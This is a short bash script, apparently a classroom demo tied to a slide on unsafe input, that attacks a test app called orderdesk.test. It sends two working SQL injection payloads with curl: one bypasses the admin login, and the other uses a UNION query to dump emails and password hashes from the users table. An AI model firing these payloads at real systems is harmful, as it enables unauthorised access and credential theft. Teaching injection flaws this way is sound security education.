#!/usr/bin/env bash
# Attack 03 · Unsafe input (slide 15)
source "$(dirname "$0")/_lib.sh"

say "Log in as admin with the wrong password"
curl -s -X POST "$BASE/api/login" -H 'content-type: application/json' \
  -d '{"email":"admin@orderdesk.test'"'"'--","password":"nope"}'; echo

say "Bonus: the search box dumps the users table"
curl -s -G "$BASE/api/search" \
  --data-urlencode "q=zzz' UNION SELECT id, email || ' : ' || password_hash, 0 FROM users--"; echo
